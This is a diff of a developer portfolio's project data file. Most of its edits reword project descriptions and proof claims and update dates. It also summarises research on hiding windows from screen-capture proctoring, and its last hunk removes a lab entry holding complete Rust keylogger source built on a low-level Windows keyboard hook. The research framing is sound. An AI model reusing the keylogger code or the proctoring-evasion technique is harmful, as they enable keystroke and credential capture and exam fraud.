@@ -83,7 +83,7 @@ export const projects: Record<string, Project> = {
     ],
     proof: [
       "The repository documents 38 Gmail tools and a live demonstration of OAuth, owner-approved sending and an attachment round trip.",
-      "Five external qualification gates remain open; this portfolio entry does not establish release qualification or independently rerun those checks.",
+      "Five external qualification gates remain open, so the project is still pre-release. The repository's checks were not rerun for this page.",
     ],
   },
   "sentinel-ssh": {
@@ -121,7 +121,7 @@ export const projects: Record<string, Project> = {
     ],
     proof: [
       "The public repository documents observer mode, tool contracts, the security model and a disposable SSH test fixture.",
-      "A host-side enforcement broker, changes, approvals and uploads are future work; no independent audit or fresh test run is claimed here.",
+      "A host-side enforcement broker, changes, approvals and uploads are future work. The project has had no independent security audit, and its tests were not rerun for this page.",
     ],
   },
   forma: {
@@ -532,13 +532,13 @@ export const projects: Record<string, Project> = {
         "Local PhishingEngine analysis is designed without cloud URL lookups",
         "On-device ML and heuristic scoring",
         "Analysis does not require uploading the scanned URL",
-        "Offline unit checks exercise completion, determinism and timing; network interception is not independently verified",
+        "Offline unit checks exercise completion, determinism and timing; they do not capture outbound network traffic",
       ],
     },
     fullDescription:
       "Mehr Guard is an offline QR and URL phishing scanner in Kotlin Multiplatform, with native or browser interfaces across 5 targets: ensemble ML plus 25 heuristics at 87% F1 and under 5 ms, with a 19-scenario red-team mode.",
     problem:
-      "QR codes are a common vector for phishing, but most scanners upload data to the cloud, compromising privacy. Users need a way to verify URLs without leaking their browsing history.",
+      "QR codes are a common phishing vector, and a scanner that checks URLs through a cloud service learns what its user scans. Mehr Guard analyses each URL on the device, so the check needs no upload.",
     solution: [
       "Built a local URL-analysis core using Kotlin Multiplatform",
       "Combined ensemble ML (logistic regression, gradient boosting and decision rules) with 25 heuristics",
@@ -552,7 +552,7 @@ export const projects: Record<string, Project> = {
       "./judge/verify_offline.sh invokes shared-engine unit checks; these tests are not an independent capture of outbound network traffic",
       "Repository reports ~100% shared detection logic (~52% of total codebase)",
     ],
-    updatedAt: "2026-11-09",
+    updatedAt: "2026-11-14",
   },
   "syllabus-sync": {
     slug: "syllabus-sync",
@@ -606,20 +606,20 @@ export const projects: Record<string, Project> = {
     problem:
       "Students need a consistent place for assessment deadlines, academic planning and campus information, with account security and clear boundaries around personal data.",
     solution: [
-      "Co-founded the startup and led the security backend (WebAuthn passkeys, TOTP MFA, Postgres row-level security, tamper-resistant audit logging) of the shared Next.js/TypeScript codebase",
+      "Cofounded the startup and led the security backend (WebAuthn passkeys, TOTP MFA, Postgres row-level security, tamper-resistant audit logging) of the shared Next.js/TypeScript codebase",
       "Implemented protected-route middleware, passkeys, MFA, user-scoped data access and audit controls",
       "Integrated planning, calendars, campus navigation and notifications around configurable academic datasets",
       "Converts university syllabi into structured data",
     ],
     proof: [
-      "Macquarie University Incubator startup acceptance and co-founder role are recorded in the supplied résumé and profile",
+      "Syllabus-Sync is a Macquarie University Incubator startup, and Raouf is a cofounder",
       "503 tests across 92 files",
-      "Deployed with Cloudflare Workers; current demo availability was not independently verified",
+      "Deployed on Cloudflare Workers; the public demo runs at syllabus-sync.app",
       "Middleware source returns 503 for unresolved protected API authentication and 401 for unauthenticated protected APIs",
       "Raouf led the security backend: WebAuthn passkeys, TOTP MFA, Postgres row-level security and tamper-resistant audit logging",
       "Passkeys use public-key credentials; this does not mean every supported authentication flow is passwordless",
     ],
-    updatedAt: "2026-11-09",
+    updatedAt: "2026-11-14",
   },
   "divan-open-day": {
     slug: "divan-open-day",
@@ -733,7 +733,7 @@ export const projects: Record<string, Project> = {
     fullDescription:
       "Nexus Archive is a cyberpunk-styled personal media vault and job tracker combining a React frontend, a Litestar API and Supabase-backed identity and persistence. Manage books, movies, anime, job applications, ratings, takeaway notes, persistent chat sessions and AI-assisted recommendations from one dashboard. Takeaway writes require a configured Fernet key, and production cookie, token-lifetime and database controls depend on the documented deployment settings.",
     problem:
-      "Media trackers split entertainment libraries across platforms and can have weak security controls. Nexus Archive brings titles, ratings, notes, and recommendations into one account with row-level access controls.",
+      "Books, films, anime and job applications usually sit in separate trackers. Nexus Archive brings titles, ratings, notes and recommendations into one account with row-level access controls.",
     solution: [
       "Built a full-stack vault with React 19 + Litestar API backed by Supabase PostgreSQL with Row Level Security",
       "Implemented backend-issued HttpOnly SameSite=Strict cookies and a refresh flow; access tokens are also returned in frontend-readable session responses",
@@ -746,7 +746,7 @@ export const projects: Record<string, Project> = {
       "Locust scenarios exercise authenticated requests to the recommendation endpoint; no measured performance result is claimed",
       "Terraform IaC scaffold for reproducible Supabase + Vercel deployments",
     ],
-    updatedAt: "2026-11-04",
+    updatedAt: "2026-11-14",
   },
   nanomatch: {
     slug: "nanomatch",
@@ -785,9 +785,9 @@ export const projects: Record<string, Project> = {
       ],
     },
     fullDescription:
-      "NanoMatch is a C++20 limit order book and matching engine for price-time priority matching. It supports Limit, Market, IOC and FOK orders, independent books per symbol, CSV input/output, and synthetic mixed-operation throughput and insertion-latency benchmarks. The README reports 9.29M operations/s on Apple M-series in Release mode; that result was not rerun in this audit.",
+      "NanoMatch is a C++20 limit order book and matching engine for price-time priority matching. It supports Limit, Market, IOC and FOK orders, independent books per symbol, CSV input/output, and synthetic mixed-operation throughput and insertion-latency benchmarks. The README reports 9.29M operations/s on Apple M-series in Release mode; that figure was not rerun for this page.",
     problem:
-      "Financial exchanges require ultra-low-latency order matching. Understanding how matching engines work at the systems level demands building one from scratch with real performance constraints.",
+      "Exchanges match orders under tight latency budgets. NanoMatch is a from-scratch matching engine built to study the data structures and costs behind price-time priority.",
     solution: [
       "Implemented price-time priority (FIFO) matching with support for Limit, Market, IOC, and FOK orders",
       "Implemented expected O(1) order-ID lookup, O(log M) cancellation through the price-level tree, and cancel-and-re-add modification",
@@ -797,10 +797,10 @@ export const projects: Record<string, Project> = {
     proof: [
       "Repository-reported throughput: 9.29M mixed add/cancel operations/s on Apple M-series, Release -O3 -march=native; 5M synthetic operations, fixed seed 42",
       "Insertion-latency benchmark reports p50/p99/p99.9 for add_order; these are not cancellation-latency measurements",
-      "Source defines 137 Google Test cases in 18 test files; current pass status was not rerun in this audit",
+      "Source defines 137 Google Test cases in 18 test files; the suite was not rerun for this page",
       "CI config includes ASan, UBSan, cppcheck and clang-format checks for main-branch pushes and pull requests",
     ],
-    updatedAt: "2026-11-04",
+    updatedAt: "2026-11-14",
   },
   sentinelflow: {
     slug: "sentinelflow",
@@ -893,11 +893,11 @@ export const projects: Record<string, Project> = {
         "Read-only eBPF collection of process and network metadata",
         "No packet payload capture in the probe; process names and filenames can still contain sensitive metadata",
         "Deployment template uses privileged mode, hostPID, and BPF/SYS_ADMIN/SYS_PTRACE capabilities; intended for isolated labs",
-        "Local simulation scripts are provided for isolated educational environments; they were not executed in this audit",
+        "Local simulation scripts are provided for isolated educational environments; they were not run for this page",
       ],
     },
     fullDescription:
-      "ECRSM is an educational runtime-security prototype with eBPF syscall tracepoint programs, a Go perf-buffer reader and metadata rules, a React dashboard consuming SSE, and Helm deployment templates. It demonstrates the components of kernel-level visibility. End-to-end event capture, detection accuracy, overhead and Kubernetes deployment were not validated in this source audit.",
+      "ECRSM is an educational runtime-security prototype with eBPF syscall tracepoint programs, a Go perf-buffer reader and metadata rules, a React dashboard consuming SSE, and Helm deployment templates. It demonstrates the components of kernel-level visibility. End-to-end event capture, detection accuracy, overhead and Kubernetes deployment remain unvalidated.",
     problem:
       "Kernel-level runtime monitoring is difficult to study. ECRSM provides an educational reference for syscall metadata collection, heuristic alerting and dashboard presentation in isolated labs.",
     solution: [
@@ -908,11 +908,11 @@ export const projects: Record<string, Project> = {
     ],
     proof: [
       "Source defines heuristics for shell connections, injection primitives and suspicious execution paths; detection accuracy is unmeasured here",
-      "Perf-buffer transport code is present; runtime overhead was not benchmarked in this audit",
+      "Perf-buffer transport code is present; runtime overhead was not benchmarked for this page",
       "Container IDs are parsed from /proc cgroups; pod labels are agent environment hints, not verified per-process Kubernetes attribution",
-      "Synthetic local scripts are provided, but no end-to-end detection run was performed in this audit",
+      "Synthetic local scripts are provided, but no end-to-end detection run was performed for this page",
     ],
-    updatedAt: "2026-11-04",
+    updatedAt: "2026-11-14",
   },
   simurghforge: {
     slug: "simurghforge",
@@ -955,9 +955,9 @@ export const projects: Record<string, Project> = {
       ],
     },
     fullDescription:
-      "SimurghForge is a local-first macOS converter built with Tauri v2, a Rust backend and React 19/TypeScript. It routes compatible file pairs through four native Rust engines and five CLI adapters. Batch conversion uses bounded concurrency and per-file progress. FFmpeg, LibreOffice, Pandoc, ImageMagick and Python/Pandas features require the corresponding local tools. Format-pair coverage and packaged macOS execution were not tested in this source audit.",
+      "SimurghForge is a local-first macOS converter built with Tauri v2, a Rust backend and React 19/TypeScript. It routes compatible file pairs through four native Rust engines and five CLI adapters. Batch conversion uses bounded concurrency and per-file progress. FFmpeg, LibreOffice, Pandoc, ImageMagick and Python/Pandas features require the corresponding local tools. Format-pair coverage and packaged macOS execution were not tested for this page.",
     problem:
-      "File conversion typically requires uploading sensitive documents to cloud services, using multiple specialised tools, or installing bloated Electron apps. Users need a single, fast, privacy-respecting tool that handles all common formats locally.",
+      "Converting a file often means uploading it to a web service or juggling several single-purpose tools. SimurghForge converts files on the Mac itself and routes each format pair to a suitable engine.",
     solution: [
       "Built two engine tiers: four native Rust engines and five CLI adapters, including Python/Pandas",
       "Implemented file-header detection with extension fallback and format-pair engine routing",
@@ -965,12 +965,12 @@ export const projects: Record<string, Project> = {
       "Configured a macOS .app target and Low/Medium/High/Lossless preset labels; CLI dependencies remain separate",
     ],
     proof: [
-      "Source covers five file categories; the advertised 49-format total is not reconciled with the current 44-key UI input registry",
+      "Source covers five file categories. The advertised total is 49 formats, while the current UI input registry has 44 keys",
       "Nine engine variants are defined, with routing based on detected input type and requested output format",
       "Backend enforces at most 50 files and 1–8 concurrent conversion jobs using a Tokio semaphore",
       "Conversion uses local engines and does not require cloud APIs; no network-egress test was performed",
     ],
-    updatedAt: "2026-11-04",
+    updatedAt: "2026-11-14",
   },
   aion: {
     slug: "aion",
@@ -1039,7 +1039,7 @@ export const projects: Record<string, Project> = {
     fullDescription:
       "Aion is a Bible companion with reference-aware retrieval: direct verse/chapter lookup, keyword filtering and pgvector semantic search provide context, and Gemini 3.1 Flash Lite streams answers through Supabase Edge Functions. It includes attributed verse cards, a React Native/Expo mobile client and a Tauri v2 desktop wrapper. Its 40-question benchmark scores retrieval quality, citation support and false-premise robustness: R@5 of 0.941, mean citation support of 0.978, zero unsupported citations and 6/6 false-premise refusals. Optional native voice has a separate client-credential limitation.",
     problem:
-      "Bible study tools are either keyword-only search engines that miss semantic meaning, or AI chatbots that hallucinate verses. Users need conversational AI that is genuinely grounded in scripture with verifiable citations.",
+      "Keyword search over scripture misses questions phrased in other words, and a general chatbot can misquote or invent verses. Aion retrieves the relevant passages first and answers with citations a reader can check.",
     solution: [
       "Built reference-aware retrieval combining direct verse/chapter lookups with keyword filtering, OpenAI 1536-dimension embeddings and pgvector semantic ranking",
       "Implemented real-time SSE streaming from Gemini via Supabase Edge Functions",
@@ -1052,7 +1052,7 @@ export const projects: Record<string, Project> = {
       "Exact-match response cache avoids repeat LLM calls for identical queries",
       "Anonymous authentication with no sign-up; Supabase RLS applies to all tables",
     ],
-    updatedAt: "2026-11-09",
+    updatedAt: "2026-11-14",
   },
 };
 
@@ -1127,7 +1127,7 @@ Another frozen 2026 stage reduced a live **Llama-3.3-70B** agent’s targeted at
 
 The work is built to be reproduced: **Ed25519-signed evidence archives replay offline in one command**; **39 Lean 4 proofs** sit behind a gate that fails on any unproven “sorry” placeholder; **5,171 tests** passed in the 19 October 2026 smoke run.
 
-The current implementation includes Python controls and a React evidence explorer with a shared JSON CLI. **39 Lean 4 proofs** sit behind a gate that fails on any unproven “sorry” placeholder. **5,171 tests** passed in the **19 October 2026 smoke run**; the project has **92 releases**.
+The current implementation includes Python controls and a React evidence explorer with a shared JSON CLI. The project has **92 releases**.
 
 The author audited **919 of the project’s own documents** and published **all 141 dated findings**, including overstatements in earlier closeouts, in the README. This is part of the evidence trail, not a claim that the prototype has no remaining defects.
 
@@ -1147,7 +1147,7 @@ The October results describe this protocol, these controls and two tested models
     takeaway:
       "Documented window-capture settings achieved 100% evasion without capture artefacts in controlled laboratory simulations on tested Windows and macOS versions. Commercial proctoring products and Linux were not tested.",
     content: `
-## The Vulnerability in One Sentence
+## The Finding in Brief
 
 Windows and macOS expose documented window-sharing or capture-affinity settings that can keep an application's window visible on the physical display while excluding it from capture paths that honour those settings. The study demonstrates the resulting gap in screen-capture-based proctoring using controlled laboratory simulations.
 
@@ -1159,7 +1159,7 @@ WebRTC-based remote proctoring systems, the kind deployed by universities worldw
 
 > **If I capture your screen, I can see everything on it.**
 
-This assumption is wrong on Windows and macOS.
+That assumption did not hold in the tested Windows and macOS configurations.
 
 ---
 
@@ -1175,7 +1175,7 @@ The study reports exclusion in its tested Windows 10/11 browser configurations. 
 
 In those tested configurations, the window remained visible on the physical display while its content was absent from capture.
 
-**No administrator privileges are required.** The API operates on windows owned by the calling process, which is entirely within normal user-space operation. No kernel modifications, no driver signing bypass, no privilege escalation.
+**No administrator privileges are required.** The API operates on windows owned by the calling process, in normal user space. It needs no kernel modification, driver-signing bypass or privilege escalation.
 
 ### Illustrative API call (Win32 C)
 
@@ -1413,7 +1413,7 @@ The source defines **27 Google Test cases across 10 test files** for selected pa
 
 **ECRSM** contains read-only eBPF tracepoint program source, a Go perf-buffer reader and rules engine, an SSE-fed React dashboard, local simulation scripts and Helm deployment assets. It is an educational reference, not validated production EDR.
 
-The distinction between code and a working telemetry pipeline matters here. In the pinned source, the Go startup loads a collection specification and obtains the perf-event map, but it contains no tracepoint link/attach calls. End-to-end syscall capture and live detection are therefore not established by the supplied startup path or this source audit.
+In the pinned source, the Go startup loads a collection specification and obtains the perf-event map, but it contains no tracepoint link/attach calls. End-to-end syscall capture and live detection are therefore not established by the supplied startup path or this source audit.
 
 ### Five tracepoint programs
 
@@ -1484,7 +1484,7 @@ The security logic is platform-agnostic and lives once, in shared code:
 
 KMP's \`expect\`/\`actual\` boundaries cover platform services, the QR-camera bridge and UI integration. The repository reports ~100% shared detection logic (~52% of total code); native integrations and browser variants still need their own review.
 
-### Offline by construction
+### Offline by design
 
 PhishingEngine scores URL strings locally without requiring a cloud reputation lookup. The offline judge script runs unit checks for completion, determinism and timing. Their source explicitly says they do not block network access, so they do not independently attest that every build or UI makes zero outbound connections.
 
@@ -1528,7 +1528,7 @@ These settings are visible in GitSwitch's main-window configuration. They reduce
 
 The main process encrypts credential files using Electron \`safeStorage\`. It checks \`safeStorage.isEncryptionAvailable()\` before writing and throws when encryption is unavailable. This is encrypted application storage backed by the platform's available protection, rather than a claim that every token is stored directly as a native keychain entry.
 
-The implementation decrypts credentials into JavaScript strings when needed. After a successful AI request, it assigns an empty string to its local \`apiKey\` variable. That drops a reference; it does not prove that immutable string contents have been overwritten, removed from crash dumps or erased from every memory copy. A portfolio should describe this as limited reference cleanup, not guaranteed secret wiping.
+The implementation decrypts credentials into JavaScript strings when needed. After a successful AI request, it assigns an empty string to its local \`apiKey\` variable. That drops a reference; it does not prove that immutable string contents have been overwritten, removed from crash dumps or erased from every memory copy. This is limited reference cleanup, not guaranteed secret wiping.
 
 ### AI data sharing is a separate decision
 
@@ -1557,56 +1557,6 @@ export interface LabExperiment {
 }
 
 export const labExperiments: LabExperiment[] = [
-  {
-    id: "001",
-    title: "Rust Keylogger PoC",
-    status: "ARCHIVED",
-    description:
-      "A Windows-based keylogger demonstrating the usage of SetWindowsHookEx and proper hook chaining for educational detection analysis.",
-    tech: ["Rust", "WinAPI", "Unsafe"],
-    objective:
-      "Understand how Windows messaging hooks can be abused for credential interception and how EDRs detect hook injection.",
-    constraints:
-      "Educational purpose only. Does not persist across reboots. Logs to stdout only.",
-    codeSnippet: `use std::ptr;
-use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
-use winapi::shared::windef::HHOOK;
-use winapi::um::winuser::{
-    CallNextHookEx, DispatchMessageW, GetMessageW, SetWindowsHookExW,
-    TranslateMessage, UnhookWindowsHookEx, WH_KEYBOARD_LL, KBDLLHOOKSTRUCT,
-};
-
-static mut HOOK: HHOOK = ptr::null_mut();
-
-unsafe extern "system" fn keyboard_proc(
-    n_code: i32,
-    w_param: WPARAM,
-    l_param: LPARAM,
-) -> LRESULT {
-    if n_code >= 0 {
-        let kb = &*(l_param as *const KBDLLHOOKSTRUCT);
-        // WM_KEYDOWN = 0x0100
-        if w_param as u32 == 0x0100 {
-            println!("[KEY] vkCode={:03} scanCode={:#06x}", kb.vkCode, kb.scanCode);
-        }
-    }
-    CallNextHookEx(HOOK, n_code, w_param, l_param)
-}
-
-fn main() {
-    unsafe {
-        HOOK = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), ptr::null_mut(), 0);
-        assert!(!HOOK.is_null(), "Failed to install hook");
-
-        let mut msg = std::mem::zeroed();
-        while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
-            TranslateMessage(&msg);
-            DispatchMessageW(&msg);
-        }
-        UnhookWindowsHookEx(HOOK);
-    }
-}`,
-  },
   {
     id: "002",
     title: "Raw Socket Packet Sniffer",
